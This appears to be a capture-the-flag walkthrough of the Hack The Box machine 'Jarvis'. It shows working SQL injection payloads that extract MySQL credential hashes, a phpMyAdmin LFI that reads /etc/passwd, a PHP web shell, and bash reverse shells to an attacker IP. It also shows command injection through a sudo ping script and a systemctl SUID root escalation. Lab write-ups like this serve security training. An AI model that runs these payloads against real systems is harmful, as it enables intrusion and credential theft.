# Jarvis
## Reconnaissance
### Initial Port Scan
```bash
sudo ./nmapAutomator.sh 10.10.10.143 All
```
* Result
![1](https://user-images.githubusercontent.com/53956303/132777471-26e90a91-e288-4e7b-a4bc-14dbe5729603.png)
![2](https://user-images.githubusercontent.com/53956303/132777568-83bfb8aa-006a-4851-b3c0-c9c6b7b4ee45.png)

## Emumeration
## Port 80
* On Port 80, an web page "Stark Hotel" is found

![3](https://user-images.githubusercontent.com/53956303/132777792-536702e0-e1dd-4fb9-b7e0-925502f3af84.png)
### room.php
* During the enumeration, when click the "Rooms" button, it redirects to `rooms-suites.php`. 

![4](https://user-images.githubusercontent.com/53956303/132778297-c76f7629-f239-4b5b-af28-b77b1c835f95.png)
* Then, when click "Book Now!" of any choice, it redirects to `room.php` with a parameter `cod` with assigned ID of each room.

![5](https://user-images.githubusercontent.com/53956303/132778460-85fc648b-7f6e-4a64-aea9-deecf58d9ad4.png)
## Exploitation
### Identify SQL injection Vulnerability
* Put a single qutoe `'` to at the ID number
```bash
http://10.10.10.143/room.php?cod='
```
* From the result, an interesting result is found

![6](https://user-images.githubusercontent.com/53956303/132778589-9f329755-faec-4e90-82d2-e7db0884f7f7.png)
* It does not return a room inforamtion but returns something.

### SQL Injection to Determine Number of Columns of The Query
```bash
10.10.10.143/room.php?cod=100 Union SELECT 1;-- -
.
.
.
10.10.10.143/room.php?cod=100 Uniton SELECT 1,2,3,4,5,6,7;-- -
```
* When enter 1 - 6 and 8 -, it returns the same result as a single quote

![6](https://user-images.githubusercontent.com/53956303/132779048-d2cfbdac-7945-4571-be7e-6c70f47b4b37.png)

* When enter 7 as columns, it returns something different

![7](https://user-images.githubusercontent.com/53956303/132779081-b647b00c-4e3d-4a8b-ba6c-dc064f23af3e.png)
* It means there has 7 columns in query

### SQL Injection to List Databases
```bash
http://10.10.10.143/room.php?cod=100 UNION SELECT 1,group_concat(schema_name),3,4,5,6,7 from information_schema.schemata;-- -
```
* From the result, some database names are retruned

![9](https://user-images.githubusercontent.com/53956303/132779289-483a1f7e-88d9-4170-8b82-aef700c57fc3.png)

### SQL Injection to List Tables Names in `mysql` Database
```bash
http://10.10.10.143/room.php?cod=100 UNION SELECT 1, group_concat(table_name),3,4,5,6,7 from information_schema.tables where table_schema='mysql';-- -
```
* From the result, some table names are given

![12](https://user-images.githubusercontent.com/53956303/132779614-adb07544-7294-4d1d-ba79-113deb09196a.png)
* Open the page source to see every table names

![13](https://user-images.githubusercontent.com/53956303/132779676-2a157379-5d38-402d-be65-80538f03b245.png)

### SQL Injection to List Column Names in `user` table
```bash
http://10.10.10.143/room.php?cod=100 UNION SELECT 1,group_concat(column_name),3,4,5,6,7 from information_schema.columns where table_name='user';-- -
```
* From the result, some colum names are found

![14](https://user-images.githubusercontent.com/53956303/132779763-62bebec1-7d4a-42cc-8d8b-6969dd4b3541.png)
  * From the list of column names, interesting column names `User` and `Password` are found

### SQL Injection to Extract values from `User` and `Password` columns
```bash
http://10.10.10.143/room.php?cod=100 UNION SELECT 1, user, 3,4,password,6,7 from mysql.user;-- -
```
* From the result, username and password hash are found

![15](https://user-images.githubusercontent.com/53956303/132780030-6b12ecf3-f690-4d82-99dc-28ee461f6b82.png)
 `DBadmin / 2D2B7A5E4E637B8FBA1D17F40318F277D29964D0`
 ### Crack the Password Hash using 
 * From the [CrackStation](https://crackstation.net), the password hash is cracked

![16](https://user-images.githubusercontent.com/53956303/132780197-52e8bb19-f7ef-424a-93dc-80d6b78f75ef.png)
## Web Enumeration
### FFuf Result from NmapAutomator

![17](https://user-images.githubusercontent.com/53956303/132780301-0134824f-14fe-4129-91be-7f3ac27a2f48.png)
* From the result, `phpmyadmin` is found
  * Since the credentials for `DBadmin` is obtained, it might be use for "PHPMyadmin" on Port 80

### /phpmyadmin
![18](https://user-images.githubusercontent.com/53956303/132780413-4c19682b-c78e-408a-9bad-3b6494c6a7f8.png)
* With obtaiend credentials, access to PHPmyadmin is granted

![19](https://user-images.githubusercontent.com/53956303/132780505-41ec9c87-2153-4cf1-a923-ba8013265a59.png)
* From the page, version number is found
`Php Myadmin 4.8.0`
### PHPMyAdmin 4.8.x - LFI to RCE

|[PHPMyAdmin 4.8.x - LFI to RCE](https://github.com/vulnspy/vulnspy.github.io/issues/1)|
|----|
* From the post, Local File Inclusion vulnerability is working on PHP 4.8.x versions.

### Test LFI to Call `/etc/passwd` on the Target Machine
```bash
http://10.10.10.143/phpmyadmin/index.php?target=db_sql.php%3f/../../../../../etc/passwd
```
* from the result, the `/etc/passwd` file is returned

![20](https://user-images.githubusercontent.com/53956303/132780819-839b0109-91a4-4386-8b90-cba33c378faa.png)

## Initial Foothold
### Make a `cmd.php` on the Target Machine using LFI on PHPMyAdmin
* It will make `cmd.php` which will take a command using LFI
```bash
# On the SQL on PHPMyAdmin
SELECT '<?php system($_GET["cmd"]);?>' into outfile "/var/www/html/sh3ll.php"
```
* Then, click "Go" to execute

![22](https://user-images.githubusercontent.com/53956303/132781028-1683f978-2a11-436f-b19c-8862f00923c4.png)

### Test `cmd.php`
* use curl to test `cmd.php`
```bash
curl http://10.10.10.143/sh3ll.php?cmd=id
```
* It works!

![23](https://user-images.githubusercontent.com/53956303/132781177-b1b04e9c-f1f8-4f1c-89ee-90ea7fd55adf.png)
### Getting a Reverse Shell
#### Open a Netcat Listener on Kali
```bash
sudo nc -lnvp 4444
```
#### Using `cmd.php` to Get a Netcat Reverse Shell
* Capture the traffic using Burp Suite to trigger the exploit
 * URL ENCODE TO USE!


![24](https://user-images.githubusercontent.com/53956303/132782604-53afa3c8-eaba-49d8-8a58-1b813be96ae5.png)
```bash
GET /sh3ll.php?cmd=bash -c "bash -i >& /dev/tcp/10.10.14.17/4444 0>&1"
```

* As a result, a reverse shell as "www-data" is open

![25](https://user-images.githubusercontent.com/53956303/132782696-28b7875b-2d36-4e4e-9b0c-56801bcb0087.png)
### Getting a Stable Shell
```bash
python -c "import pty;pty.spawn('/bin/bash')"
ctrl + z
stty raw -echo
fg
export TERM=xterm-256color
```
## Lateral Movement (www-data => Pepper)
### See the Sudo Privileges
```bash
sudo -l
```
* From the result, `www-data` can use `/var/www/Admin-Utilities/simpler.py` as `Pepper` witout password

![26](https://user-images.githubusercontent.com/53956303/132782935-857293ce-5245-4381-89dc-112f67bc0266.png)
### Enumerate `simpler.py`
```bash
cat /var/www/Admin-Utilities/simpler.py
```
* From the `exec_ping` function, it calls `os` library

![27](https://user-images.githubusercontent.com/53956303/132783086-8284fcec-8d3f-4a4e-bb15-37d5e84d26c1.png)
* Since there has some forbidden are found, an attacker cannot simply execute a second command after the pinging.
 * Nevertheless, the `$` Character is not banned. Therefore, the attacker can try to ping the result of a command with the following
 ```bash
 #(<Command>)
 ```
 ### Use `$` to use `os.system()`
 ### Download the attacker's SSH Public Key as `authorized_keys`
 ```bash
 # Kali
 cp /home/kali/.ssh/id_rsa.pub ~/Desktop/htb/javis/authorized_keys
 sudo python3 -m http.server 80
 ```
 ### Download the Publick Key as Authorized_Keys by abusing the Sudo privileges
 * `-p` flag to select Ping fucntion
 ```bash
 sudo -i pepper /var/www/Admin-Utilities/simpler.py -p
 Enter an IP: $(wget http://10.10.14.17/authorized_keys)
 ```
 * Successfully downloaded

![28](https://user-images.githubusercontent.com/53956303/132785153-7eeeda34-5d2a-4ebf-b43e-43932b663e28.png)
### Create `.ssh` Directory at the Pepper's Home Directory and Move the Authorized_keys
```bash
sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
Enter an IP: $(mkdir /home/pepper/.ssh)

sudo -u pepper /var/www/Admin-Utilities/simpler.py -p
Enter an IP: $(mv authorized_keys /home/pepper/.ssh)
```
### Connect SSH as "Pepper"
```bash
ssh -i /home/kali/.ssh/id_rsa pepper@10.10.10.143
```
* As a result, an SSH shell as Pepper is opened

![ssh_pepper](https://user-images.githubusercontent.com/53956303/132785534-867f1b88-f160-4e9f-be8f-dc56ec358f08.png)
## Privilege Escalation (Pepper => Root)
### Run linpeas.sh
```bash
# Kali
sudo python3 -m http.server 80

# Target machine
wget http://10.10.14.17/linpea.sh 
```
### Exeucte Linpea.sh
```bash
chmod +x linpea.sh
./linpea.sh
```
* From the result, at the SUID section, a vulnerable SUID bit is found
`/bin/systemctl`

![28](https://user-images.githubusercontent.com/53956303/132786157-999d9f05-f272-47b5-ae6b-9454359657a6.png)
### Use `/bin/systemctl` as Sudo to Escalate Privileges
|[Sudo Systemctl Exploit - GTFObins](https://gtfobins.github.io/gtfobins/systemctl/#sudo)|
|----|
#### Open a Netcat Listener
```bash
sudo nc -lnvp 9999
```
#### Exploit to get a Root shell
```bash
TF2=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/bash -c "bash -i >& /dev/tcp/10.10.14.17/9999 0>&1"
[Install]
WantedBy=multi-user.target' > $TF2
/bin/systemctl link $TF2
/bin/systemctl enable --now $TF2
```
* As a result, a root shell is open

![29](https://user-images.githubusercontent.com/53956303/132786678-e06ffbdd-cb85-46d9-8524-20e00d14f64c.png)
